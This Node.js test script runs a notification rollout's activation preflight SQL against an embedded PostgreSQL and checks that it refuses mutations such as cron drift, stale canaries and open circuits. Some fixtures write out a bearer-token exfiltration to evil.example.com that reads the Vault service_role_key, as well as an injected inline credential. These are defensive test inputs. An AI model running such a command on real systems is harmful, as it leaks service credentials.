// ===========================================================================
// preflight-pg.mjs — EXECUTE activation_preflight.sql and canary_verify.sql on a
// REAL PostgreSQL, against production-shaped rows.
//
// WHY THIS EXISTS SEPARATELY FROM enablement-selftest.sh. That suite stubs psql,
// so it proves the dispatcher's CONTROL FLOW — which artifact runs, in what
// order, under which gate. It cannot prove that an artifact's assertions are
// true statements about a database, and the four findings this closes are all of
// exactly that kind: a drifted cron command, a stale canary, an `accepted`
// attempt over a correlation mismatch, a tripped breaker. A stub answers "the
// preflight ran"; only a real server answers "the preflight would have REFUSED".
//
// Every scenario below is a mutation of one fact away from a passing baseline,
// and asserts the preflight FAILS on it. A scenario that passes when it should
// fail is a hole in the gate, not a failing test of a working gate.
//
// pg_cron is not installable in the embedded server, so cron.job is created as a
// REAL table with pg_cron's own shape — including that jobname is unique PER
// USERNAME, which is how pg_cron actually scopes it. The notification tables are
// sliced out of the REAL migrations rather than hand-written: a lookalike is how
// an earlier suite in this slice ended up asserting against a column production
// does not have.
//
// Run: node scripts/rollout/notif-10cb/verify/preflight-pg.mjs
// ===========================================================================
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { boot } from '../../notif-10ca3/verify/chain.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const SQL_DIR = join(HERE, '..', 'sql');
const REPO = join(HERE, '..', '..', '..', '..');
const MIG = (f) => readFileSync(join(REPO, 'supabase', 'migrations', f), 'utf8');

const PORT = 54391;
let PASS = 0, FAIL = 0;
const rec = (n, ok, d = '') => {
  const l = `  ${ok ? 'PASS' : 'FAIL'}  ${n}${d ? '  — ' + d : ''}`;
  (ok ? console.log : console.error)(l);
  ok ? PASS++ : FAIL++;
};

const RUN = '77777777-7777-4777-8777-777777777777';
const OTHER_RUN = '88888888-8888-4888-8888-888888888888';
const GROUP = '99999999-9999-4999-8999-999999999999';
const ATTEMPT = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';
const MSG = 'resend-msg-canary-1';

// The reviewed command, taken from the migration itself so this file cannot
// drift from what F actually schedules.
const CRON_MIG = MIG('20261012100000_notif_10cb_digest_cron_inert.sql');
const REVIEWED = (() => {
  const m = CRON_MIG.match(
    /cron\.schedule\(\s*'notification-digest-worker'\s*,\s*'([^']+)'\s*,\s*\$cmd\$([\s\S]*?)\$cmd\$\s*\)/);
  if (!m) throw new Error('could not extract the reviewed cron schedule/command from the F migration');
  return { schedule: m[1], command: m[2] };
})();

/** Slice a real CREATE TABLE block out of a migration — never a hand-written lookalike. */
function tableDdl(sql, name) {
  const start = sql.indexOf(`CREATE TABLE IF NOT EXISTS public.${name} (`);
  if (start < 0) throw new Error(`no DDL for ${name}`);
  const end = sql.indexOf('\n);', start);
  if (end < 0) throw new Error(`unterminated DDL for ${name}`);
  return sql.slice(start, end + 3);
}

/** psql artifact -> something node-pg can run: inline \i, drop other meta-commands, bind vars. */
function artifactText(name, vars = {}) {
  let t = readFileSync(join(SQL_DIR, name), 'utf8');
  for (let i = 0; i < 6; i++) {
    const before = t;
    t = t.replace(/^\\i r? ?([^\s]+\.sql)\s*$/gm, (_m, f) => readFileSync(join(SQL_DIR, f), 'utf8'));
    t = t.replace(/^\\i ([^\s]+\.sql)\s*$/gm, (_m, f) => readFileSync(join(SQL_DIR, f), 'utf8'));
    if (t === before) break;
  }
  t = t.replace(/^\\.*$/gm, '');
  // psql's :'x' interpolates a QUOTED literal; :x interpolates raw.
  for (const [k, v] of Object.entries(vars)) {
    t = t.split(`:'${k}'`).join(`'${v}'`).split(`:${k}`).join(String(v));
  }
  if (/:'?[a-z_]+'?::uuid/.test(t)) throw new Error(`unbound psql variable left in ${name}`);
  return t;
}

const { epg, conn } = await boot(PORT);
const c = conn();
await c.connect();

try {
  // ── schema: the REAL migrations' own DDL ─────────────────────────────────
  await c.query(`CREATE ROLE anon; CREATE ROLE authenticated; CREATE ROLE service_role BYPASSRLS;`);

  const foundation = MIG('20261002100000_notification_digest_schema_foundation.sql');
  for (const t of ['notification_worker_runs', 'notification_digest_groups',
                   'notification_digest_attempts', 'notification_digest_group_attempts',
                   'notification_provider_circuit']) {
    await c.query(tableDdl(foundation, t));
  }

  // pg_cron's real shape. jobname is UNIQUE PER USERNAME — a globally unique
  // jobname would make the preflight's owner-scoping untestable and make its
  // lookups look safe when they are not.
  await c.query(`
    CREATE SCHEMA cron;
    CREATE TABLE cron.job (
      jobid bigserial PRIMARY KEY, schedule text NOT NULL, command text NOT NULL,
      -- pg_cron dispatches a job to (nodename, nodeport); a normally-scheduled job carries this
      -- server's own. Hard-coding 5432 here would make the baseline fail on the embedded server's
      -- port and hide what the node assertions actually do.
      nodename text NOT NULL DEFAULT 'localhost',
      nodeport integer NOT NULL DEFAULT current_setting('port')::int,
      database text NOT NULL DEFAULT current_database(),
      username text NOT NULL DEFAULT current_user,
      active boolean NOT NULL DEFAULT true, jobname text,
      UNIQUE (jobname, username));
    -- alter_job by jobid, as real pg_cron does — activate.sql arms the id it locked, never a name.
    CREATE FUNCTION cron.alter_job(job_id bigint, active boolean DEFAULT NULL)
      RETURNS void LANGUAGE sql AS $f$ UPDATE cron.job SET active = coalesce($2, active) WHERE jobid = $1 $f$;`);

  // The catalog columns the preflight reads (20260910100000 + C's 20261011100000).
  await c.query(`
    CREATE TABLE public.notification_event_types (
      key text PRIMARY KEY,
      supports_digest boolean NOT NULL DEFAULT false,
      digest_engine_enabled boolean NOT NULL DEFAULT false,
      digest_cutover boolean NOT NULL DEFAULT false,
      updated_at timestamptz NOT NULL DEFAULT now());
    -- the orphan queue's operator-facing state (20261006110000)
    CREATE TABLE public.notification_orphan_reconcile_state (
      provider_message_id text PRIMARY KEY,
      quarantined boolean NOT NULL DEFAULT false);`);

  // the REAL liveness function, from the F migration
  const liveness = CRON_MIG.slice(CRON_MIG.indexOf(
    'CREATE OR REPLACE FUNCTION public.notif_digest_worker_liveness()'));
  await c.query(liveness);

  // ── the baseline world: a clean, fresh, delivering canary ────────────────
  const seedBaseline = async () => {
    await c.query(`
      DELETE FROM cron.job;
      DELETE FROM public.notification_provider_circuit;
      DELETE FROM public.notification_digest_group_attempts;
      UPDATE public.notification_digest_groups SET current_attempt_id = NULL;
      DELETE FROM public.notification_digest_attempts;
      DELETE FROM public.notification_digest_groups;
      DELETE FROM public.notification_worker_runs;
      DELETE FROM public.notification_event_types;
      DELETE FROM public.notification_orphan_reconcile_state;`);
    await c.query(
      `INSERT INTO cron.job (jobname, schedule, command, active) VALUES ('notification-digest-worker', $1, $2, false)`,
      [REVIEWED.schedule, REVIEWED.command]);
    await c.query(`
      INSERT INTO public.notification_event_types (key, supports_digest, digest_engine_enabled, digest_cutover)
        VALUES ('open_slots_player', true, true, true);
      INSERT INTO public.notification_worker_runs (run_id, worker, channel, phase, status, started_at, ended_at)
        VALUES ('${RUN}', 'notification-digest-worker', 'email', 'dispatch', 'succeeded',
                now() - interval '3 minutes', now() - interval '2 minutes');
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at,
         state, provider_message_id, provider_status, provider_status_rank, worker_run_id)
        VALUES ('${GROUP}', '{"k":1}'::jsonb, 'hash-1', 'email', 'open_slots_player', 'rk-1',
                'fp-1', 'Europe/Amsterdam', now(), now(), 'sent', '${MSG}', 'sent', 1, '${RUN}');
      INSERT INTO public.notification_digest_attempts
        (attempt_id, digest_group_id, worker_run_id, provider_idempotency_key,
         outcome_class, provider_message_id, recorded_at, http_status)
        VALUES ('${ATTEMPT}', '${GROUP}', '${RUN}', 'idem-1', 'accepted', '${MSG}', now(), 200);`);
  };

  const preflight = async () => {
    try { await c.query(artifactText('activation_preflight.sql', { run_id: RUN })); return null; }
    catch (e) { await c.query('ROLLBACK').catch(() => {}); return e.message; }
  };
  const canaryVerify = async () => {
    try { await c.query(artifactText('canary_verify.sql', { run_id: RUN })); return null; }
    catch (e) { await c.query('ROLLBACK').catch(() => {}); return e.message; }
  };

  // A scenario mutates ONE fact and must be REFUSED. `needle` pins which
  // assertion did the refusing, so a scenario cannot pass by failing elsewhere —
  // the trap that makes a red test look like a working guard.
  const refuses = async (name, mutate, needle) => {
    await seedBaseline();
    // A mutation that cannot even be applied would otherwise abort the whole
    // run, or — worse — leave the baseline in place and let the scenario "pass"
    // for a reason that has nothing to do with the thing under test.
    try { await mutate(); }
    catch (e) { return rec(name, false, `the scenario's own setup failed: ${e.message}`); }
    const err = await preflight();
    if (!err) return rec(name, false, 'the preflight PASSED — the gate does not cover this');
    rec(name, err.includes(needle), err.includes(needle) ? '' : `refused for the wrong reason: ${err}`);
  };

  console.log('\n10c-b G — activation_preflight.sql against a real PostgreSQL\n');

  // ── the baseline must PASS, or every refusal below is meaningless ────────
  await seedBaseline();
  {
    const err = await preflight();
    rec('a clean, fresh, delivering canary PASSES the preflight', err === null, err ?? '');
  }
  {
    const err = await canaryVerify();
    rec('...and passes canary_verify too', err === null, err ?? '');
  }

  // ── finding 1: the job must be THE REVIEWED JOB ──────────────────────────
  await refuses('a DRIFTED SCHEDULE is refused',
    () => c.query(`UPDATE cron.job SET schedule = '*/1 * * * *'`),
    'the cron schedule is the reviewed one');

  await refuses('a job bound to ANOTHER DATABASE is refused',
    () => c.query(`UPDATE cron.job SET database = 'some_other_db'`),
    'the cron job runs in THIS database');

  // pg_cron dispatches to (nodename, nodeport). A re-pointed node executes the reviewed command —
  // hash and all — against a different server entirely, so every other assertion still passes.
  await refuses('a job re-pointed to another NODENAME is refused',
    () => c.query(`UPDATE cron.job SET nodename = 'replica.internal'`),
    'executes on THIS node');

  await refuses('a job re-pointed to another NODEPORT is refused',
    () => c.query(`UPDATE cron.job SET nodeport = nodeport + 1`),
    'executes on THIS port');

  await refuses('a command posting to a DIFFERENT ENDPOINT is refused',
    () => c.query(`UPDATE cron.job SET command = replace(command,
      'https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker',
      'https://evil.example.com/collect')`),
    'the cron command posts to the reviewed notification-digest-worker endpoint');

  // The exfiltration shape: the reviewed post still happens, so the endpoint
  // check above passes — and a SECOND post ships the same Vault bearer away.
  await refuses('a command with a SECOND url (bearer exfiltration) is refused',
    () => c.query(`UPDATE cron.job SET command = command ||
      $x$ SELECT net.http_post(url := 'https://evil.example.com/collect',
        headers := jsonb_build_object('Authorization', 'Bearer ' ||
          (SELECT decrypted_secret FROM vault.decrypted_secrets WHERE name = 'service_role_key')));$x$`),
    'names NO url other than the reviewed endpoint');

  // Deliberately KEEPS the Vault read and adds a hard-coded "fallback" beside it
  // — the plausible shape, and the one that isolates this detector. Replacing the
  // Vault read outright would trip the tick-time-Vault assertion first, and the
  // scenario would look green while proving nothing about inline credentials.
  await refuses('a command carrying an INLINE CREDENTIAL beside the Vault read is refused',
    () => c.query(`UPDATE cron.job SET command = replace(command,
      '(SELECT decrypted_secret FROM vault.decrypted_secrets WHERE name = ''service_role_key'')',
      'coalesce((SELECT decrypted_secret FROM vault.decrypted_secrets WHERE name = ''service_role_key''),
                ''eyJhbGciOiJIUzI1NiJ9.injected.signature'')')`),
    'contains NO inline credential');

  await refuses('any other command drift is refused by the whole-text check',
    () => c.query(`UPDATE cron.job SET command = command || ' -- harmless looking trailing comment'`),
    'EXACTLY the reviewed command');

  await refuses('a job owned by ANOTHER ROLE does not satisfy the check',
    () => c.query(`UPDATE cron.job SET username = 'someone_else'`),
    'the digest cron job exists');

  await refuses('an ALREADY ARMED job is refused',
    () => c.query(`UPDATE cron.job SET active = true`),
    'still INACTIVE');

  // ── finding 3: activation is bound to THIS canary ────────────────────────
  await refuses('a canary that did not SUCCEED is refused',
    () => c.query(`UPDATE public.notification_worker_runs SET status = 'failed' WHERE run_id = '${RUN}'`),
    'the canary run SUCCEEDED');

  await refuses('a canary still IN FLIGHT is refused',
    () => c.query(`UPDATE public.notification_worker_runs SET ended_at = NULL WHERE run_id = '${RUN}'`),
    'the canary run has FINISHED');

  await refuses('a NEWER dispatch run than the named canary is refused',
    () => c.query(`INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at, ended_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', 'failed',
              now() - interval '1 minute', now())`),
    'in flight, started after, or ended after this canary');

  await refuses('a dispatch run IN FLIGHT alongside the canary is refused',
    () => c.query(`INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', NULL, now())`),
    'in flight, started after, or ended after this canary');

  // ORDERING BY COMPLETION HAS A HOLE. A run that STARTED after the canary and failed FAST — so it
  // also ENDED before the canary did — is newer by invocation and invisible to an ended_at
  // comparison. This is the scenario that made the ordering wrong, so it is pinned explicitly.
  await refuses('a run that STARTED after the canary but ended BEFORE it is refused',
    () => c.query(`INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at, ended_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', 'failed',
              now() - interval '2 minutes 30 seconds', now() - interval '2 minutes 10 seconds')`),
    'in flight, started after, or ended after this canary');

  await refuses('a canary older than the freshness window is refused',
    () => c.query(`UPDATE public.notification_worker_runs
      SET started_at = now() - interval '9 hours', ended_at = now() - interval '8 hours'
      WHERE run_id = '${RUN}'`),
    'within the last 6 hours');

  // THE ORIGINAL DEFECT, directly: evidence from an earlier rollout must not
  // license this activation. The accepted attempt and the sent group exist —
  // they just belong to a different run.
  await refuses('an ACCEPTED ATTEMPT FROM ANOTHER RUN is not this canary\'s evidence',
    () => c.query(`UPDATE public.notification_digest_attempts
      SET worker_run_id = NULL WHERE attempt_id = '${ATTEMPT}'`),
    'at least one ACCEPTED send attempt');

  await refuses('a group this canary never attempted does not count as delivered',
    () => c.query(`
      WITH g AS (
        INSERT INTO public.notification_digest_groups
          (canonical_group_key, group_key_hash, channel, event_type, recipient_key,
           destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
        VALUES ('{"k":2}'::jsonb, 'hash-2', 'email', 'open_slots_player', 'rk-2', 'fp-2',
                'Europe/Amsterdam', now(), now(), 'no_work') RETURNING id)
      UPDATE public.notification_digest_attempts a
         SET digest_group_id = (SELECT id FROM g)
       WHERE a.attempt_id = '${ATTEMPT}'`),
    'reached sent');

  // ── finding 4: `accepted` is not proof of a clean send ───────────────────
  // The exact production shape: record_notification_digest_result wrote the
  // attempt as accepted BEFORE noticing the group was bound to a different
  // provider message, then manual-held the channel and returned a value the
  // worker never reads. Every earlier assertion is satisfied.
  await refuses('an ACCEPTED attempt over a CORRELATION MISMATCH is refused',
    () => c.query(`UPDATE public.notification_digest_attempts
      SET provider_message_id = 'resend-msg-DIFFERENT' WHERE attempt_id = '${ATTEMPT}'`),
    'disagrees with its group about the provider message id');

  await refuses('a global_config ledger event for this canary is refused',
    () => c.query(`INSERT INTO public.notification_digest_group_attempts
      (worker_run_id, digest_group_id, attempt_id, action)
      VALUES ('${RUN}', '${GROUP}', '${ATTEMPT}', 'global_config')`),
    'no global_config event');

  await refuses('an OPEN email circuit (the manual hold) is refused',
    () => c.query(`INSERT INTO public.notification_provider_circuit (channel, state, reason, tripped_at, retry_at)
      VALUES ('email', 'open', 'correlation_mismatch', now(), NULL)`),
    'email provider circuit is CLOSED');

  await refuses('a HALF-OPEN email circuit is refused',
    () => c.query(`INSERT INTO public.notification_provider_circuit (channel, state, reason, tripped_at)
      VALUES ('email', 'half_open', 'probing', now())`),
    'email provider circuit is CLOSED');

  // A CLOSED row must NOT be refused — otherwise the assertion above is just
  // "no circuit row has ever existed", which is a different (and weaker) claim.
  await seedBaseline();
  await c.query(`INSERT INTO public.notification_provider_circuit (channel, state) VALUES ('email', 'closed')`);
  {
    const err = await preflight();
    rec('a CLOSED email circuit row still passes', err === null, err ?? '');
  }

  // ── the pre-existing gates must still hold ───────────────────────────────
  await refuses('the engine being OFF is refused',
    () => c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`),
    'the digest engine is enabled for open_slots_player');

  await refuses('a SECOND event with the engine enabled is refused',
    () => c.query(`INSERT INTO public.notification_event_types
      (key, supports_digest, digest_engine_enabled) VALUES ('session_reminder_player', true, true)`),
    'no event other than open_slots_player');

  await refuses('a group mid-send is refused',
    () => c.query(`INSERT INTO public.notification_digest_groups
      (canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES ('{"k":3}'::jsonb, 'hash-3', 'email', 'open_slots_player', 'rk-3', 'fp-3',
              'Europe/Amsterdam', now(), now(), 'sending')`),
    'no digest group is mid-send');

  await refuses('a quarantined orphan is refused',
    () => c.query(`INSERT INTO public.notification_orphan_reconcile_state
      (provider_message_id, quarantined) VALUES ('orphan-1', true)`),
    'no orphan provider event is quarantined');

  // ── activate.sql: verify and arm, atomically ─────────────────────────────
  // The preflight proves what the world looked like at CHECK time. Arming in a separate statement
  // meant the job could be altered, replaced or deleted in between — and an arm-by-name matching
  // zero rows succeeds silently, so the tooling would report ARMED over a job that was gone.
  const activate = async () => {
    try { await c.query(artifactText('activate.sql', { run_id: RUN })); return null; }
    catch (e) { await c.query('ROLLBACK').catch(() => {}); return e.message; }
  };
  const jobActive = async () =>
    (await c.query(`SELECT active FROM cron.job WHERE jobname='notification-digest-worker'
                     AND username=current_user`)).rows[0]?.active ?? null;

  await seedBaseline();
  {
    const err = await activate();
    rec('activate ARMS the cron when every assertion passes', err === null, err ?? '');
    rec('...and the job really is active afterwards', (await jobActive()) === true);
  }

  // A FAILING assertion must leave the world untouched — that is what the transaction is for.
  await seedBaseline();
  await c.query(`UPDATE cron.job SET schedule = '*/1 * * * *'`);
  {
    const err = await activate();
    rec('activate REFUSES a drifted job', !!err && err.includes('the cron schedule is the reviewed one'),
      err ?? 'it armed the job');
    rec('...and the cron is STILL INACTIVE (the transaction rolled back)', (await jobActive()) === false);
  }

  await seedBaseline();
  await c.query(`UPDATE public.notification_worker_runs SET status = 'failed' WHERE run_id = '${RUN}'`);
  {
    const err = await activate();
    rec('activate REFUSES a canary that did not succeed', !!err && err.includes('the canary run SUCCEEDED'),
      err ?? 'it armed the job');
    rec('...and armed nothing', (await jobActive()) === false);
  }

  // THE SILENT NO-OP. Arming by name when the job has been unscheduled matches zero rows and
  // SUCCEEDS — the failure that made the old flow report a cron it had not armed.
  await seedBaseline();
  await c.query(`DELETE FROM cron.job`);
  {
    const err = await activate();
    rec('activate FAILS LOUDLY when the job has vanished (never a silent no-op)',
      !!err && err.includes('the digest cron job exists'), err ?? 'it reported success over a missing job');
  }

  // ── canary_verify carries the same mismatch guard ────────────────────────
  await seedBaseline();
  await c.query(`UPDATE public.notification_digest_attempts
    SET provider_message_id = 'resend-msg-DIFFERENT' WHERE attempt_id = '${ATTEMPT}'`);
  {
    const err = await canaryVerify();
    rec('canary_verify ALSO refuses a correlation mismatch',
      !!err && err.includes('disagrees with its group about the provider message id'), err ?? 'it PASSED');
  }
} finally {
  await c.end().catch(() => {});
  await epg.stop().catch(() => {});
}

console.log(`\n================  ${PASS} passed, ${FAIL} failed  ================\n`);
process.exit(FAIL === 0 ? 0 : 1);
